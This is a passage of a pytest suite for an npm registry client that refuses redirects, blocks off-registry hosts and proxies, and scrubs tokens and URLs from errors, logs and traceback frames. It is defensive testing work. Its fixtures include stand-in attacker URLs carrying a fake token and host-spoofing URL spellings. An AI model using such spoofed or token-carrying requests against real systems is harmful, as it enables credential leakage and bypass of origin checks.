    assert closure(request, 12.5) == "answered"
    assert seen == {"request": request, "timeout": 12.5}


@pytest.mark.parametrize("status", [301, 302, 303, 307, 308])
def test_a_redirect_answered_by_the_transport_is_refused_without_a_second_request(
    status: int,
) -> None:
    """Run through urllib's own entry point, `http_error_302` — the method the opener calls for
    every one of these codes — so the real redirect machinery decides what happens:
    `get_request_url` encodes the target, `redirect_request` is asked for a new request, and the
    answer is a refusal. Because nothing is returned, there is no second request to make."""
    handler = _RefuseRedirectHandler()
    headers = email.message.Message()
    headers["Location"] = "https://attacker.invalid/express"
    request = _request(npm_package_url("express"))

    with pytest.raises(RegistryRedirectError) as excinfo:
        handler.http_error_302(request, io.BytesIO(b""), status, "Moved", headers)

    assert excinfo.value.status_code == status
    assert "attacker.invalid" not in str(excinfo.value)
    assert str(excinfo.value).isascii()


def test_a_redirect_without_a_location_header_is_left_to_urllib_default_handling() -> None:
    """`HTTPRedirectHandler.http_error_302` returns None when there is nothing to follow, and the
    opener then reaches `HTTPDefaultErrorHandler`, which raises an `HTTPError` the client maps to
    `RegistryRedirectError`. Returning None is the correct behaviour for the handler, so this
    asserts it instead of pretending the refusal came from here."""
    handler = _RefuseRedirectHandler()
    request = _request(npm_package_url("express"))

    assert handler.http_error_302(request, io.BytesIO(b""), 301, "Moved", {}) is None


def test_the_redirect_refusal_names_the_request_it_refused() -> None:
    """The URL PackProof built is not secret and not attacker-supplied; naming it is what tells a
    reader which package the registry behaved oddly about."""
    handler = _RefuseRedirectHandler()
    request = _request(npm_package_url("@babel/core"))

    with pytest.raises(RegistryRedirectError, match="@babel%2Fcore") as excinfo:
        handler.redirect_request(request, None, 302, "Found", None, "https://elsewhere.invalid/x")

    assert "elsewhere.invalid" not in str(excinfo.value)


# --------------------------------------------------------------------------- the redirect handle


@pytest.mark.parametrize("status", [301, 302, 303, 307, 308])
def test_a_redirect_from_the_production_opener_is_refused_and_its_handle_released(
    monkeypatch: pytest.MonkeyPatch,
    status: int,
) -> None:
    """The leak this correction exists for, reached through the transport the client really uses.

    `HTTPRedirectHandler.http_error_302` releases a redirect with `fp.read()` and then
    `fp.close()` — and only after `redirect_request` has answered. This handler answers by
    raising, so that cleanup is never reached and the connection is nobody's to release. All
    five codes are asserted rather than one because urllib aliases `http_error_301` through
    `http_error_308` onto the same method: a fix that only covered the 302 route would still
    strand the other four.

    Two requirements ride along in the same assertions. The handle refuses to be read, so reaching
    the `close_attempts` line at all is the proof that nothing was drained; the single entry in the
    list of URLs asked for is the proof that the `Location` header was not obeyed either.
    """
    handle = RedirectHandle(b"the body of a redirect nobody asked for")
    raised, requests_made = _fetch_through_production_opener(monkeypatch, status, handle)

    assert type(raised) is RegistryRedirectError
    assert raised.status_code == status
    assert handle.close_attempts == 1
    assert handle.closed
    assert requests_made == [npm_package_url("express")]
    message = str(raised)
    assert _REDIRECT_TARGET not in message
    assert "attacker.invalid" not in message
    assert "token" not in message
    assert message_is_ascii_and_short(message)


def test_the_production_opener_asks_this_modules_handler_before_answering(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Demonstrates that the code under test is the code that ran.

    A test calling `redirect_request` itself proves what that method does; it cannot prove the
    shipped opener routes a 3xx there. This one wraps the class's own method with a recorder
    that forwards to the original, so the refusal still comes from unmodified production code
    while the recording shows urllib reached it: once, with the response object that is still
    holding this handle, and with the absolute target urllib assembled from the header the
    message then refuses to repeat.
    """
    handle = RedirectHandle(b"the body of a redirect nobody asked for")
    seen: list[tuple[int, object, str]] = []
    original = _RefuseRedirectHandler.redirect_request

    def spy(
        self: _RefuseRedirectHandler,
        req: urllib.request.Request,
        fp: object,
        code: int,
        msg: str,
        headers: object,
        newurl: str,
    ) -> urllib.request.Request:
        seen.append((code, fp, newurl))
        return original(self, req, fp, code, msg, headers, newurl)

    monkeypatch.setattr(_RefuseRedirectHandler, "redirect_request", spy)
    raised, requests_made = _fetch_through_production_opener(monkeypatch, 301, handle)

    assert len(seen) == 1
    code, response, newurl = seen[0]
    assert code == 301
    assert getattr(response, "fp", None) is handle
    assert _REDIRECT_TARGET in newurl
    assert requests_made == [npm_package_url("express")]
    assert type(raised) is RegistryRedirectError
    assert raised.status_code == 301
    assert handle.close_attempts == 1
    assert _REDIRECT_TARGET not in str(raised)


def test_a_real_urllib_response_releases_its_inner_handle_and_is_not_read() -> None:
    """The delegation proved on urllib's own class rather than on this file's stub.

    `addinfourl` is what a 3xx actually hands to `http_error_302`, and its `close()` and `closed`
    come from `tempfile._TemporaryFileWrapper`, which forwards to the wrapped handle and then stops
    forwarding. Asserting against the real class is what keeps `RedirectResponse` honest: it says
    this handler releases the object production would have handed it — and, measured on every
    Python in CI's matrix, without the test having to know which versions make `status` a read-only
    property.
    """
    handle = RedirectHandle(b"a redirect body that must stay in the buffer")
    headers = email.message.Message()
    headers["Location"] = _REDIRECT_TARGET
    response = urllib.response.addinfourl(handle, headers, npm_package_url("express"), 302)
    handler = _RefuseRedirectHandler()

    with pytest.raises(RegistryRedirectError) as excinfo:
        handler.http_error_302(
            _request(npm_package_url("express")), response, 302, "Moved Temporarily", headers
        )

    assert excinfo.value.status_code == 302
    assert handle.close_attempts == 1
    assert handle.closed
    assert response.closed


def test_a_redirect_refusal_survives_a_response_that_is_not_there() -> None:
    """`fp` is None on this path as easily as it is a handle — other code raises into urllib's
    machinery on a transport's behalf, and `HTTPError` is constructed with `fp=None` in the wild.
    "Release the redirect response" therefore has to mean "if there is one": a refusal that turns
    into an `AttributeError` mid-cleanup loses the category and the status number together, which
    is the one thing a caller cannot reconstruct."""
    handler = _RefuseRedirectHandler()
    headers = email.message.Message()
    headers["Location"] = _REDIRECT_TARGET

    with pytest.raises(RegistryRedirectError) as excinfo:
        handler.http_error_302(
            _request(npm_package_url("express")), None, 303, "See Other", headers
        )

    assert excinfo.value.status_code == 303
    assert _REDIRECT_TARGET not in str(excinfo.value)


def test_an_already_released_redirect_handle_is_not_closed_a_second_time(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The `closed` guard, on the redirect path rather than the `HTTPError` one.

    The transport may be finished with a response before the opener looks at it, which is what
    happens to a zero-length body that http.client closes as it reaches EOF. A second `close()` is
    harmless on a file object — that is exactly why this needs a counting handle instead of a
    `closed` check: "declined to participate" is a behaviour, and the only witness is the handle's
    own tally.
    """
    handle = RedirectHandle(b"")
    handle.close()
    assert handle.close_attempts == 1

    raised, requests_made = _fetch_through_production_opener(monkeypatch, 308, handle)

    assert type(raised) is RegistryRedirectError
    assert raised.status_code == 308
    assert handle.close_attempts == 1
    assert requests_made == [npm_package_url("express")]


def test_a_redirect_handle_that_refuses_to_close_does_not_replace_the_refusal(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The same rule as the error handle, on the other route out of a 3xx.

    A descriptor that will not release must not become the story: if the `OSError` escaped the
    cleanup it would surface above this layer as `RegistryNetworkError` — the wrong category, no
    status number, and the actual HTTP 307 lost. The refusal has to survive its own failed close.
    """
    handle = UncloseableHandle(b"redirect body")

    raised, requests_made = _fetch_through_production_opener(monkeypatch, 307, handle)

    assert type(raised) is RegistryRedirectError
    assert raised.status_code == 307
    assert handle.close_attempts == 1
    assert "Bad file descriptor" not in str(raised)
    assert requests_made == [npm_package_url("express")]


def test_a_redirect_with_nothing_to_follow_is_left_for_the_error_handle_path() -> None:
    """Both halves of a 3xx with no `Location`, in one place because they are one handoff.

    The handler returns None rather than inventing a refusal — urllib then reaches
    `HTTPDefaultErrorHandler`, which raises an `HTTPError` carrying the very same response object,
    and the earlier `_open` correction releases it. Asserted in that order: declining to act must
    not close anything, and the route that does close must close exactly once.
    """
    handler = _RefuseRedirectHandler()
    handle = RedirectHandle(b"a redirect with no target")

    declined = handler.http_error_302(
        _request(npm_package_url("express")), handle, 302, "Moved", email.message.Message()
    )
    assert declined is None
    assert handle.close_attempts == 0

    raised, error = _expect_http_error(302, handle)

    assert type(raised) is RegistryRedirectError
    assert raised.status_code == 302
    assert raised.__cause__ is error
    assert handle.close_attempts == 1


def test_a_redirect_with_nothing_to_follow_is_still_released_in_the_production_opener(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The same no-`Location` handoff taken end to end, so the close is not credited to a stub.

    This is the one redirect case in this file where the handle is released by the `HTTPError`
    correction rather than the redirect one, and it is here to say the two do not overlap by
    accident: a 3xx that urllib converts to an `HTTPError` arrives at `_open` holding the response,
    gets exactly one close there, and still leaves as `RegistryRedirectError` with its number.
    """
    handle = RedirectHandle(b"a redirect with no target")

    raised, requests_made = _fetch_through_production_opener(
        monkeypatch, 302, handle, location=None
    )

    assert type(raised) is RegistryRedirectError
    assert raised.status_code == 302
    assert handle.close_attempts == 1
    assert handle.closed
    assert requests_made == [npm_package_url("express")]


# --------------------------------------------------------------------------- transport policy


def _director_behind(closure: Callable[..., object]) -> urllib.request.OpenerDirector:
    """The `OpenerDirector` an opener closure captured.

    Reachable only through the closure cell, and that is the point: what is asserted below is the
    chain the client actually builds for itself, not a chain a test assembled to resemble it.
    """
    for cell in closure.__closure__ or ():
        try:
            value = cell.cell_contents
        except ValueError:
            continue
        if isinstance(value, urllib.request.OpenerDirector):
            return value
    raise AssertionError("the production opener captured no OpenerDirector")


def _connect_recorder(seen: list[str]) -> Callable[..., object]:
    """A stand-in for `do_open` that records the address instead of dialling it.

    `AbstractHTTPHandler.do_open` is the one function in the chain that connects, so substituting
    it leaves the origin guard, the redirect refuser and the error processor running as
    production. What is recorded is `request.host` — the verbatim netloc that same function splits
    into its connect target, and therefore the thing worth knowing.
    """

    def do_open(
        self: object, http_class: object, request: urllib.request.Request, **kwargs: object
    ) -> object:
        seen.append(request.host)
        raise OSError(101, "stubbed: this is where a socket would have been opened")

    return do_open


class _SiblingGuard(urllib.request.BaseHandler):
    """The rejected guard shape, kept so the rejection stays a measurement.

    An `https_open` on a `BaseHandler` sibling is installed happily and consulted never, because
    `bisect` sorts the chain by `handler_order` — 500 for both this and the stock
    `HTTPSHandler`, and the defaults are added first. A guard in this shape would leave every
    other test in this file green.
    """

    def https_open(self, req: urllib.request.Request) -> object:
        raise AssertionError("a sibling guard was consulted, which the design says cannot happen")


def test_the_https_chain_production_builds_is_the_origin_guard_alone() -> None:
    """`handle_open["https"]` is the list urllib walks, in order, until one answers.

    One entry, and it is the guard: that single fact is what makes the host comparison a control
    rather than a comment, because any other handler in front of it would get the request first.
    """
    director = _director_behind(_default_opener())
    chain = [type(handler).__name__ for handler in director.handle_open["https"]]

    assert chain == ["_OriginGuardHTTPSHandler"]
    assert not any(type(handler) is urllib.request.HTTPSHandler for handler in director.handlers)


def test_the_guard_displaces_the_stock_handler_because_it_subclasses_it() -> None:
    """The relation, not the argument order, is the mechanism.

    `build_opener` skips any default class one of its arguments `isinstance`-matches, which is why
    passing an `HTTPSHandler` subclass removes the stock one and passing a `BaseHandler` does not.
    Asserting the subclass explicitly is the cheap half; the sibling control below is the proof.
    """
    assert issubclass(npm_fetcher._OriginGuardHTTPSHandler, urllib.request.HTTPSHandler)
    sole_handler = _director_behind(_default_opener()).handle_open["https"][0]
    assert type(sole_handler) is npm_fetcher._OriginGuardHTTPSHandler


@pytest.mark.parametrize(
    "url",
    [
        "https://cdn.evil.invalid/left-pad/-/left-pad-1.3.0.tgz?token=SEKRITabc123",
        "https://@registry.npmjs.org/express",
        "https://REGISTRY.NPMJS.ORG/express",
        "https://registry.npmjs.org./express",
        "https://registry.npmjs.org:443/express",
        "https://registry.npmjs.org:8443/express",
        "https://registry.npmjs.org.evil.invalid/express",
    ],
    ids=[
        "foreign host",
        "userinfo authority",
        "uppercase authority",
        "trailing dot",
        "explicit default port",
        "other port",
        "registry as a prefix",
    ],
)
def test_a_request_addressed_otherwise_than_the_registry_host_never_reaches_connecting(
    url: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Every spelling of "looks like the registry" that the comparison refuses, on the real chain.

    The userinfo case is the reason `req.host` is compared rather than `urlsplit().hostname`:
    `hostname` strips the userinfo and lowercases, so it reports an allowed host for a request the
    transport would dial at `@registry.npmjs.org`. The port, case and trailing-dot cases are
    refusals of addresses that would in fact reach the right machine — a deliberate tightening,
    since no URL either client builds can spell them: both are assembled by `urlunsplit` from the
    constant host with no port and no case folding.
    """
    seen: list[str] = []
    monkeypatch.setattr(urllib.request.AbstractHTTPHandler, "do_open", _connect_recorder(seen))
    opener = _default_opener()

    with pytest.raises(UnexpectedDownloadOriginError):
        opener(_request(url), 5.0)

    assert seen == []


def test_the_url_this_module_builds_is_allowed_through_the_guard(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The other direction, which the refusal tests cannot show on their own: a scoped name that
    `npm_package_url` percent-encodes still arrives at the connect layer, at the registry address
    and nowhere else. Without this, a guard that refused everything would pass the section above.
    """
    seen: list[str] = []
    monkeypatch.setattr(urllib.request.AbstractHTTPHandler, "do_open", _connect_recorder(seen))
    opener = _default_opener()

    with pytest.raises(OSError, match="stubbed"):
        opener(_request(npm_package_url("@babel/core")), 5.0)

    assert seen == [NPM_REGISTRY_HOST]


def test_the_guard_refusal_names_no_address_and_scrubs_its_own_frame(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """What the guard says, and what its frame still holds once the exception is in hand.

    The message is a constant: no host, no path, no scheme separator, because the request that
    triggered it is the sensitive object. The frame is checked through the traceback rather than
    the message because a traceback is what a crash reporter, a debugger or a logging formatter
    with `stack_info` reads, and `f_locals` is the live dict — rebinding `req` in the `finally` of
    the frame that raised is what empties the frame the traceback already holds.
    """
    seen: list[str] = []
    monkeypatch.setattr(urllib.request.AbstractHTTPHandler, "do_open", _connect_recorder(seen))
    url = "https://cdn.evil.invalid/left-pad/-/left-pad-1.3.0.tgz?token=SEKRITabc123"

    with pytest.raises(UnexpectedDownloadOriginError) as excinfo:
        _default_opener()(_request(url), 5.0)

    text = str(excinfo.value)
    assert text.isascii()
    for secret in ("cdn.evil.invalid", "SEKRITabc123", "npmjs", "://", "left-pad"):
        assert secret not in text, secret
    frames = []
    link = excinfo.value.__traceback__
    while link is not None:
        if link.tb_frame.f_code.co_name == "https_open":
            frames.append(link.tb_frame)
        link = link.tb_next
    assert len(frames) == 1, "the guard's frame should be on the traceback exactly once"
    assert frames[0].f_locals["req"] is None


def test_a_sibling_guard_is_installed_but_never_consulted(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The control that keeps the guard an `HTTPSHandler` subclass.

    Built the rejected way, this chain accepts a foreign address and hands it to the connect layer
    with the guard's `https_open` never called — so the guard's own `AssertionError` below is the
    failure signal, and the recorded host is the evidence that a decorative guard is invisible to
    every other test in this file.
    """
    seen: list[str] = []
    monkeypatch.setattr(urllib.request.AbstractHTTPHandler, "do_open", _connect_recorder(seen))
    opener = urllib.request.build_opener(_RefuseRedirectHandler(), _SiblingGuard())

    with pytest.raises(OSError, match="stubbed"):
        opener.open(
            _request("https://cdn.evil.invalid/left-pad.tgz?token=SEKRITabc123"), timeout=1.0
        )

    assert [type(handler).__name__ for handler in opener.handle_open["https"]] == [
        "HTTPSHandler",
        "_SiblingGuard",
    ]
    assert seen == ["cdn.evil.invalid"]


def test_a_guard_ordered_after_the_stock_handler_sorts_behind_it() -> None:
    """Ordering is the second, independent requirement, so it gets its own measurement.

    The same class with `handler_order` raised to 600 lands behind an `HTTPSHandler` that is
    present in the chain, which is how a guard silently stops running. `bisect` compares
    `handler_order` and nothing else; the position of an argument in the `build_opener` call is
    not what decides this.
    """

    class LateGuard(npm_fetcher._OriginGuardHTTPSHandler):
        handler_order = 600

    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(), LateGuard(), _RefuseRedirectHandler()
    )

    assert [type(handler).__name__ for handler in opener.handle_open["https"]] == [
        "HTTPSHandler",
        "LateGuard",
    ]


def test_an_environment_proxy_cannot_move_the_metadata_request(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """`HTTPS_PROXY` is honoured by the stdlib transport and refused by this one.

    Three things have to hold at once for the correction to be real rather than nominal: the proxy
    is discoverable (`getproxies`, otherwise this test proves nothing), no `ProxyHandler` is
    installed to use it, and the request still arrives at the registry address. The empty mapping
    achieves the second by never being inserted at all — `add_handler` only files a handler that
    contributed a protocol method, and a handler with no proxies contributes none.
    """
    for name in (
        "HTTP_PROXY",
        "HTTPS_PROXY",
        "ALL_PROXY",
        "NO_PROXY",
        "http_proxy",
        "https_proxy",
        "all_proxy",
        "no_proxy",
    ):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("HTTPS_PROXY", "http://proxy.invalid:8080")
    assert "https" in urllib.request.getproxies(), "the fixture proxy was not discoverable"

    seen: list[str] = []
    monkeypatch.setattr(urllib.request.AbstractHTTPHandler, "do_open", _connect_recorder(seen))
    director = _director_behind(_default_opener())

    assert not any(
        isinstance(handler, urllib.request.ProxyHandler) for handler in director.handlers
    )
    assert [type(handler).__name__ for handler in director.handle_open["https"]] == [
        "_OriginGuardHTTPSHandler"
    ]
    with pytest.raises(OSError, match="stubbed"):
        _default_opener()(_request(npm_package_url("express")), 5.0)
    assert seen == [NPM_REGISTRY_HOST]


def test_a_broken_url_builder_still_cannot_reach_a_foreign_host(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The guard exists for the case where the layer above it was wrong.

    `npm_package_url` is patched to hand the client an off-registry address — a fault the client
    has no way to detect on its own — and the transport is the thing that refuses. The category
    matters as much as the refusal: this is PackProof contradicting its own policy, not the
    registry answering badly, so it arrives as itself and not wrapped in a `RegistryError`.
    """
    seen: list[str] = []
    monkeypatch.setattr(urllib.request.AbstractHTTPHandler, "do_open", _connect_recorder(seen))
    monkeypatch.setattr(npm_fetcher, "npm_package_url", lambda name: "https://cdn.evil.invalid/x")
    client = NpmRegistryClient(timeout_seconds=5.0, max_metadata_bytes=_CEILING)

    with pytest.raises(UnexpectedDownloadOriginError) as excinfo:
        client.fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert not isinstance(excinfo.value, RegistryError)
    assert seen == []


def test_the_artifact_disclosure_policy_refuses_a_redirect_without_naming_a_url() -> None:
    """The non-disclosing shape of the same refusal, for the path whose URL is a capability.

    A metadata URL is built from a constant host and a validated name, so naming it costs nothing
    and tells the reader which package the registry behaved oddly about. A tarball URL is the
    registry's own text carrying a time-limited query: repeating it in a log line would publish
    it. Both statements are asserted here, because the flag is what separates them.
    """
    signed = f"https://{NPM_REGISTRY_HOST}/left-pad/-/left-pad-1.3.0.tgz?token=SEKRITabc123"
    headers = email.message.Message()
    headers["Location"] = _REDIRECT_TARGET
    handler = _RefuseRedirectHandler(label="artifact", disclose_target=False)

    with pytest.raises(RegistryRedirectError) as excinfo:
        handler.http_error_302(_request(signed), io.BytesIO(b""), 302, "Found", headers)

    text = str(excinfo.value)
    assert text.isascii()
    assert "SEKRITabc123" not in text
    assert "left-pad" not in text
    assert _REDIRECT_TARGET not in text
    assert "artifact request" in text
    assert excinfo.value.status_code == 302


def test_the_metadata_disclosure_wording_is_still_the_reviewed_one() -> None:
    """The default shape, pinned to the exact sentence Stage 2.2 was reviewed with.

    `label` and `disclose_target` are new; the text a reader sees on this path may not be. A full
    string comparison rather than a substring, because the only difference between the two shapes
    is a clause.
    """
    built = npm_package_url("left-pad")
    headers = email.message.Message()
    headers["Location"] = _REDIRECT_TARGET

    with pytest.raises(RegistryRedirectError) as excinfo:
        _RefuseRedirectHandler().http_error_302(
            _request(built), io.BytesIO(b""), 301, "Moved", headers
        )

    assert str(excinfo.value) == (
        f"the npm registry answered the metadata request for {built} with HTTP 301 "
        "and a redirect, which PackProof does not follow"
    )


def test_the_redirect_refusal_scrubs_the_url_from_the_frame_that_raised_it() -> None:
    """The signed URL survives in a traceback frame unless the frame empties it.

    Checked the same way as the guard's: walk the exception's own traceback, find the frames this
    module owns, and read what they still bind. `_SiblingGuard` above and the stdlib frames beside
    it are the disclosed edge — PackProof's frames are the ones it can empty.
    """
    signed = f"https://{NPM_REGISTRY_HOST}/left-pad/-/left-pad-1.3.0.tgz?token=SEKRITabc123"
    headers = email.message.Message()
    headers["Location"] = _REDIRECT_TARGET
    handler = _RefuseRedirectHandler(label="artifact", disclose_target=False)

    with pytest.raises(RegistryRedirectError) as excinfo:
        handler.http_error_302(_request(signed), io.BytesIO(b""), 302, "Found", headers)

    frames = []
    link = excinfo.value.__traceback__
    while link is not None:
        if link.tb_frame.f_code.co_name == "redirect_request":
            frames.append(link.tb_frame)
        link = link.tb_next
    assert len(frames) == 1, "the refusal should be raised from exactly one frame of ours"
    own = frames[0].f_locals
    assert own["req"] is None
    assert own["newurl"] is None
    assert own["headers"] is None


# --------------------------------------------------------------------------- configuration


def test_from_settings_uses_the_configured_timeout_and_metadata_ceiling() -> None:
    """The line that connects this client to `PACKPROOF_*`. A client that invented its own limits
    would be a client whose limits nobody configured, so both numbers are read from the settings
    object and nothing else."""
    settings = Settings(http_timeout_seconds=2.5, max_metadata_bytes=4_096)
    client = NpmRegistryClient.from_settings(settings)

    assert client._timeout_seconds == 2.5
    assert client._max_metadata_bytes == 4_096


def test_a_configured_ceiling_below_a_real_packument_refuses_it_as_too_large() -> None:
    """The settings value is what bites: a 4 KB ceiling refuses a document the registry happily
    declared at 1.9 KB, and it does so before reading."""
    response = _response(_packument("express", "4.18.2"))
    client = NpmRegistryClient.from_settings(
        Settings(http_timeout_seconds=5.0, max_metadata_bytes=64)
    )
    client._opener = StubOpener(response)

    with pytest.raises(RegistryResponseTooLargeError):
        client.fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert response.read_sizes == []


def test_a_configured_timeout_reaches_the_transport_and_the_error_text() -> None:
    opener = StubOpener(TimeoutError("no answer"))
    client = _client(opener, timeout_seconds=0.25)

    with pytest.raises(RegistryTimeoutError, match="within 0.25 seconds"):
        client.fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert opener.requests[0][1] == 0.25


# --------------------------------------------------------------------------- logging


def test_a_successful_fetch_logs_three_debug_lines_about_its_own_request(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """Names, a version and a byte count. Nothing in these lines comes out of the response body,
    which is what makes a debug log safe to attach to a CI artefact."""
    document = _packument("express", "4.18.2")
    size = len(_document_bytes(document))

    with caplog.at_level(logging.DEBUG, logger="packproof.registry.npm_fetcher"):
        _fetch(document)

    assert [record.getMessage() for record in caplog.records] == [
        "npm metadata request for express@4.18.2",
        f"npm metadata received for express: {size} bytes",
        "npm metadata accepted for express@4.18.2",
    ]


def test_no_log_or_error_repeats_the_response_body(caplog: pytest.LogCaptureFixture) -> None:
    """The body is whoever-published-it's content, and a megabyte of it in a debug log is a
    megabyte of unreviewed text in a CI artefact. Only sizes, statuses, names and field paths are
    ever written — asserted across the four paths a response can take."""
    marker = "README-TEXT-THAT-MUST-NOT-APPEAR"
    document = _packument("express", "4.18.2")
    document["readme"] = marker

    failures: list[str] = []
    with caplog.at_level(logging.DEBUG, logger="packproof.registry.npm_fetcher"):
        for description, call in (
            ("accepted", lambda: _fetch(document)),
            ("not json", lambda: _fetch_body(marker.encode("ascii"))),
            (
                "wrong shape",
                lambda: _fetch_body(_document_bytes({"name": "other", "versions": {}})),
            ),
            ("too large", lambda: _fetch(document, max_metadata_bytes=8)),
        ):
            try:
                call()
            except RegistryError as exc:
                failures.append(f"{description}: {exc}")

    joined = "\n".join([record.getMessage() for record in caplog.records] + failures)
    assert len(failures) == 3
    assert marker not in joined
    assert "express-4.18.2.tgz" not in joined
    assert all(record.getMessage().isascii() for record in caplog.records)


def test_a_registry_error_message_never_carries_a_reason_phrase_or_a_body() -> None:
    """`HTTPError` hands back a readable body and a server-written reason phrase; the category
    keeps the number and drops both, because a reason phrase is another string the responder
    chose."""
    error = urllib.error.HTTPError(
        npm_package_url("express"),
        503,
        "Service Unavailable: maintenance@example.invalid",
        {"Retry-After": "30"},
        io.BytesIO(b"full disk on build-12, token=abc"),
    )

    with pytest.raises(RegistryHTTPError) as excinfo:
        _client(StubOpener(error)).fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    message = str(excinfo.value)
    assert "HTTP 503" in message
    assert "maintenance@example.invalid" not in message
    assert "token=abc" not in message
    assert message.isascii()


# --------------------------------------------------------------------------- import-time effects


def test_constructing_a_client_builds_a_transport_without_using_it() -> None:
    """The opener is built in `__init__`, and building it reads proxy environment variables —
    which is why it must not happen at import (proved by `tests/integration/test_registry_import.py`,
    which imports the package cold under an audit hook). Either way, no socket is involved until
    a fetch runs, and the autouse guard in this module would catch one."""
    client = NpmRegistryClient(timeout_seconds=1.0, max_metadata_bytes=1_024)

    assert client._opener is not None
    assert client._timeout_seconds == 1.0
